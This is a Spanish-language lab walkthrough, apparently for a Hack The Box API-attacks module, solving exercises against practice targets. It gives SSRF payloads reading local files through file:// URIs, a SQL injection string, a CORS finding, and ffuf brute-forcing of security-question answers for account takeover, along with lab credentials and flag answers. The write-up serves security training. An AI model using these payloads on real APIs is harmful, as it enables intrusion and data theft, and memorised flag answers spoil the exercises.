
<p align="center"> 
<img src="images/Api Attacks Practise street.png" width="600" alt="Resultado de Nmap">
</p>

answer: **788 Sauchiehall St.**

### Server Side Request Forgery

1. **Exploit another Server Side Request Forgery vulnerability and submit the contents of the file '/etc/flag.conf'.**

Authenticate to 154.57.164.76 , with user "`htbpentester11@pentestercompany.com`" and password "**HTBPentester11**"

Se autentifica aquí **/api/v1/authentication/suppliers/sign-in**

```
{
  "Email": "htbpentester11@pentestercompany.com",
  "Password": "HTBPentester11"
}
```

Su token: 

```json
eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjExQHBlbnRlc3RlcmNvbXBhbnkuY29tIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjpbIlN1cHBsaWVyQ29tcGFuaWVzX1VwZGF0ZSIsIlN1cHBsaWVyQ29tcGFuaWVzX1VwbG9hZENlcnRpZmljYXRlT2ZJbmNvcnBvcmF0aW9uIiwiUHJvZHVjdHNfQ3JlYXRlQnlDdXJyZW50VXNlciIsIlByb2R1Y3RzX1VwZGF0ZSIsIlByb2R1Y3RzX1VwbG9hZFBob3RvIl0sImV4cCI6MTc5MTUwMjI5MywiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.apaKdPOKe9OCee9n6FWG_je0aTaHk_nh3YCH9IYmNAvhGs51bgk1DwaT_Z3khDoNVct2EQhaVZ1Lw_uuwCzmGQ
```

Sus roles son:

- **`SupplierCompanies_Update`**: Otorga la autorización para modificar o actualizar los datos y la información existente de las empresas proveedoras en el sistema.
    
- **`SupplierCompanies_UploadCertificateOfIncorporation`**: Permite subir, adjuntar o actualizar el certificado de incorporación u otros documentos legales oficiales correspondientes a una empresa proveedora.
    
- **`Products_CreateByCurrentUser`**: Concede el permiso para que el usuario autenticado actualmente pueda registrar y crear nuevos productos dentro del catálogo o sistema.
    
- **`Products_Update`**: Permite modificar o actualizar la información de los productos existentes (como nombre, descripción, precios, etc.).
    
- **`Products_UploadPhoto`**: Autoriza al usuario a subir, cambiar o adjuntar imágenes fotográficas asociadas a los productos del catálogo.

```json
{
  "roles": [
    "SupplierCompanies_Update",
    "SupplierCompanies_UploadCertificateOfIncorporation",
    "Products_CreateByCurrentUser",
    "Products_Update",
    "Products_UploadPhoto"
  ]
}
```

En primer paso se crea un producto que se usara como via para explotar el SSRF

POST **/api/v1/products/current-user**. Se crea un producto en este endpoint.

```
{
  "NewProduct": {
    "Name": "TestProduct",
    "Price": 6,
    "PNGPhotoFileURI": ""
  }
}
```

El id del producto recién creado

```json
{
  "successStatus": true,
  "productID": "e99fa865-8d8a-4f67-b1fd-ec6431687a08"
}
```

<p align="center"> 
<img src="images/Api Attacks Practise idpostafgrrr.png" width="600" alt="Resultado de Nmap">
</p>

Se tendra que tambien obtener el ID del usuario actual en este endpoint en Get **/api/v1/suppliers/current-user**

```json
{
  "supplier": {
    "id": "5d489453-3538-4973-9479-2c37b2a5db73",
    "companyID": "b75a7c76-e149-4ca7-9c55-d9fc4ffa87be",
    "name": "HTBPentester11",
    "email": "htbpentester11@pentestercompany.com",
    "phoneNumber": "+44 9998 999992"
  }
}
```

<p align="center"> 
<img src="images/Api Attacks Practise id supeert id didid.png" width="600" alt="Resultado de Nmap">
</p>

A continuación se lleva a cabo el ataque SSRF en el siguiente endpoint PATCH **/api/v1/products**

```
{
  "UpdatedProduct": {
    "SupplierID": "5d489453-3538-4973-9479-2c37b2a5db73",
    "ProductID": "e99fa865-8d8a-4f67-b1fd-ec6431687a08",
    "Name": "TestProduct",
    "Price": 6,
    "PNGPhotoFileURI": "file:///etc/flag.conf"
  }
}
```

Se modificó con éxito el producto

<p align="center"> 
<img src="images/Api Attacks Practise modificpatch.png" width="600" alt="Resultado de Nmap">
</p>

A continuación en el endpoint **/api/v1/products/{ID}/photo** se escribirá el id del producto recién modificado.

<p align="center"> 
<img src="images/Api Attacks Practise base64grf.png" width="600" alt="Resultado de Nmap">
</p>

```
echo "SFRCezNjOTQyMzJjNGYwYjBhNTQ0YWU0MDI0ODMzZWVmMGIzfQo=" | base64 -d
```

<p align="center"> 
<img src="images/Api Attacks Practise base64htadsad.png" width="600" alt="Resultado de Nmap">
</p>

answer: **HTB{3c94232c4f0b0a544ae4024833eef0b3}**

### Security Missconfiguration

1. **Exploit another Security Misconfiguration and provide the total count of records within the target table.**

Authenticate to 154.57.164.80 , with user "`htbpentester13@hackthebox.com`" and password "<font color="#c00000">HTBPentester13</font>"

Se autentifica en el endpoint **/api/v1/authentication/customers/sign-in**

```
{
  "Email": "htbpentester13@hackthebox.com",
  "Password": "HTBPentester13"
}
```

A continuación se revisa que rol tiene el usuario.

El rol `Suppliers_GetTotalCountBySupplierNameSubstring` otorga la autorización para consultar y obtener el recuento o número total de proveedores cuyo nombre contiene o coincide con una subcadena específica proporcionada en la búsqueda.

```json
{
  "roles": [
    "Suppliers_GetTotalCountBySupplierNameSubstring"
  ]
}
```

Esto otorga acceso a GET **/api/v1/suppliers/{Name}/count**.

El recuento total de proveedores se consiguió introduciendo una inyección SQL (`test' OR 1=1 --`) dentro del parámetro de ruta `{Name}` del endpoint `/api/v1/suppliers/{Name}/count`, lo que altera la consulta subyacente a la base de datos para que la condición sea siempre verdadera y devuelva el total absoluto de registros almacenados en la tabla (151).

<p align="center"> 
<img src="images/Api Attacks Practise sqligr.png" width="600" alt="Resultado de Nmap">
</p>

2. **Submit the header and its value that expose another Security Misconfiguration in the API.**

Se usa el **Origin** porque es una etiqueta que le pones a ese sobre para decirle al servidor: _"Oye, te escribo desde esta dirección web concreta (por ejemplo, `http://127.0.0.1`_

Cuando el servidor lee esa etiqueta, responde con otra cabecera llamada **`Access-Control-Allow-Origin: *`**, que es básicamente el servidor dándote luz verde y diciendo: _"Entendido, acepto que este origen (y cualquier otro) lea la respuesta sin bloqueos de seguridad"_.

```
GET /api/v1/suppliers/test' OR 1=1 -- -/count  
Authorization: Bearer <JWT>  
Origin: http://127.0.0.1
```

<p align="center"> 
<img src="images/Api Attacks Practise corssdad.png" width="600" alt="Resultado de Nmap">
</p>

answer: **Access-Control-Allow-Origin:`*`**

### Improper Inventory Management

1. **Exploit the Improper Inventory Management vulnerability and submit the value of the 'Email' field from the deleted Supplier Company with the ID 'c250cb38-96e3-4ccf-9df2-0a03146a2d0b'.**

Se selecciona la version v0

<p align="center"> 
<img src="images/Api Attacks Practise version0.png" width="600" alt="Resultado de Nmap">
</p>

Luego en el endpoint **/api/v0/supplier-companies/deleted** buscando el id **c250cb38-96e3-4ccf-9df2-0a03146a2d0b** se encontrará la flag del ejercicio.

<p align="center"> 
<img src="images/Api Attacks Practise otra flag mas.png" width="600" alt="Resultado de Nmap">
</p>

answer: **HTB{43c2754afea99eba70fb2c8dc443c660}**

### Unsafe Consumption of APIs

1. **If v1 of Inlanefreight's E-Commerce Marketplace accepted data from the '/api/v0/suppliers/deleted' endpoint unsafely, what would the password hash of 'Yara MacDonald' be in v1?** 

En el endpoint **/api/v0/suppliers/deleted** si buscamos el usuario **Yara MacDonald** se encontrará el hash de su pass.

<p align="center"> 
<img src="images/Api Attacks Practise pass v0.png" width="600" alt="Resultado de Nmap">
</p>

answer: **006006C3167E90A7575A12E474218D86**

## Skills Assessment 

### Skills Assessment 

1. **Submit the contents of the flag at '/flag.txt'.**

Authenticate to with user "htbpentester@hackthebox.com" and password "HTBPentester"

Se va autentificar en el endpoint **/api/v2/authentication/customers/sign-in**

```
{
  "Email": "htbpentester@hackthebox.com",
  "Password": "HTBPentester"
}
```

Una vez autentificado se consigue los siguientes roles:

- **`Suppliers_Get`**: Otorga la autorización para consultar y ver los detalles de un proveedor específico de forma individual en el sistema.
    
- **`Suppliers_GetAll`**: Permite obtener la lista completa con todos los proveedores registrados en la aplicación.

```json
{
  "roles": [
    "Suppliers_Get",
    "Suppliers_GetAll"
  ]
}
```

Solo dos puntos finales de API están asociados a estos roles:

- `/api/v2/suppliers`
- `/api/v2/suppliers/{ID}`

#### Lista de proveedores

Al llamar a la API **/v2/suppliers**, se devuelve una lista de todos los proveedores. La respuesta contiene información detallada del proveedor, incluido el campo `professionalCVPDFFileURI`

<p align="center"> 
<img src="images/Api Attacks Practiselista proovedrores.png" width="600" alt="Resultado de Nmap">
</p>

Dado que el objetivo es recuperar **/flag.txt**, este campo sugiere un posible vector de ataque SSRF o de inclusión de archivos locales (LFI), lo que coincide con las vulnerabilidades analizadas anteriormente en la sección de falsificación de solicitudes del lado del servidor (SSRF).

Existe un punto final para cargar los currículos de los proveedores:

```
/api/v2/suppliers/current-user/cv (POST)
```

Un primer intento de subir un archivo PDF grande falla.

Respuesta:

```
{
  "errorMessage": "Could not upload the CV, its either malicious or very big in size"
}
```

Incluso un archivo pequeño (5 KB) es rechazado, lo que indica que el problema no está relacionado con el tamaño del archivo. Esto sugiere que solo los usuarios autenticados por el proveedor pueden subir currículums.

A pesar de estar autenticado como cliente, el usuario puede acceder a los puntos finales y los datos relacionados con el proveedor. Esto representa una vulnerabilidad de "Broken Function Level Authorization" (BFLA), ya que los clientes no deberían poder listar la información del proveedor.

#### Identificación de candidatos para el restablecimiento de contraseña

A continuación todo esto se encuentra en el endpoints **/api/v2/suppliers**

Algunos proveedores han configurado preguntas de seguridad. Al filtrar la lista de proveedores, se observa que varios utilizan la misma pregunta:

```
What is your favorite color?
```

Se extraen los proveedores que responden a esta pregunta de seguridad, junto con sus direcciones de correo electrónico.

```
P.Howard1536@globalsolutions.com
L.Walker1872@globalsolutions.com
T.Harris1814@globalsolutions.com
B.Rogers1535@globalsolutions.com
M.Alexander1650@globalsolutions.com
```

Se guardaría en un archivo llamado **emails.txt**

#### Ataque de fuerza bruta a las respuestas de preguntas de seguridad

En la sección de Autenticación, se identifica la siguiente funcionalidad de restablecimiento de contraseña:

```
/api/v2/authentication/suppliers/passwords/resets/security-question-answers
```

Se capturará la siguiente petición con **Burpsuite**

<p align="center"> 
<img src="images/Api Attacks Practise post gr.png" width="600" alt="Resultado de Nmap">
</p>

El siguiente comando descargar un .txt de todos los colores:

```
curl -sL "https://gist.githubusercontent.com/mordka/c65affdefccb7264efff77b836b5e717/raw/e65646a07849665b28a7ee641e5846a1a6a4a758/colors-list.txt" -o colors.txt
```

Se utiliza una lista de palabras que contiene colores comunes para realizar un ataque de fuerza bruta a las respuestas de la pregunta de seguridad. La plantilla de solicitud se somete a fuzzing utilizando ffuf:

```
ffuf -w emails.txt:FUZZ1 -w colors.txt:FUZZ2 -request req1.txt -request-proto http -fr "false"
```

<p align="center"> 
<img src="images/Api Attacks Practise cred.png" width="600" alt="Resultado de Nmap">
</p>

Credenciales --> `B.Rogers1535@globalsolutions.com`:**pass123**

Iniciamos sesión en el siguiente endpoint **/api/v2/authentication/suppliers/sign-in**

```
{
  "Email": "B.Rogers1535@globalsolutions.com",
  "Password": "pass123"
}
```

#### LFI

Se emite un JWT de proveedor válido. Con los privilegios de proveedor, el punto final de carga de CV ahora funciona correctamente:

Antes se crea un archivo pdf de 1 MB

```
dd if=/dev/urandom of=certificateOfIncorporation.pdf bs=1M count=1
```

En el endpoint **/api/v2/suppliers/current-user/cv** se sube, al fin se logra subir.

```json
{
  "successStatus": true,
  "fileURI": "file:///app/wwwroot/SupplierCVs/certificateOfIncorporation.pdf",
  "fileSize": 1048576
}
```

<p align="center"> 
<img src="images/Api Attacks Practise pdf 1mbn.png" width="600" alt="Resultado de Nmap">
</p>

La consulta del perfil del proveedor confirma que la ruta del archivo local se almacena en el campo "professionalCVPDFFileURI".

En Get **/api/v2/supplier/current-user** se consigue `"companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1"`

<p align="center"> 
<img src="images/Api Attacks Practise companyid.png" width="600" alt="Resultado de Nmap">
</p>

El ID del usuario es **36f17195-395f-443e-93a4-8ceee81c6106** Que se encuentra en el endpoint **/api/v2/suppliers**

<p align="center"> 
<img src="images/Api Attacks Practise id sdadasda.png" width="600" alt="Resultado de Nmap">
</p>

#### SSRF

Luego, PATCH en el endpoint **/api/v2/suppliers/current-user**

```
{
  "id": "36f17195-395f-443e-93a4-8ceee81c6106",
  "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
  "name": "Brandon Rogers",
  "email": "B.Rogers1535@globalsolutions.com",
  "SecurityQuestion": "What is your favorite color?",
  "SecurityQuestionAnswer": "rust",
  "ProfessionalCVPDFFileURI": "file:///flag.txt",
  "PhoneNumber": "string",
  "Password": "Password123"
}
```

<p align="center"> 
<img src="images/Api Attacks Practise trueeeeedasdasasd.png" width="600" alt="Resultado de Nmap">
</p>

En get **/api/v2/suppliers/current-user/cv** cuando ejecutamos nos dará el base64. `SFRCe2YxOTBiODBjZDU0M2E4NGIyMzZlOTJhMDdhOWQ4ZDU5fQo=`

<p align="center"> 
<img src="images/Api Attacks Practise base64asdasdf.png" width="600" alt="Resultado de Nmap">
</p>

```
echo "SFRCe2YxOTBiODBjZDU0M2E4NGIyMzZlOTJhMDdhOWQ4ZDU5fQo=" | base64 -d
```

<p align="center"> 
<img src="images/Api Attacks Practise flaggggggasdasdasa.png" width="600" alt="Resultado de Nmap">
</p>

answer: **HTB{f190b80cd543a84b236e92a07a9d8d59}**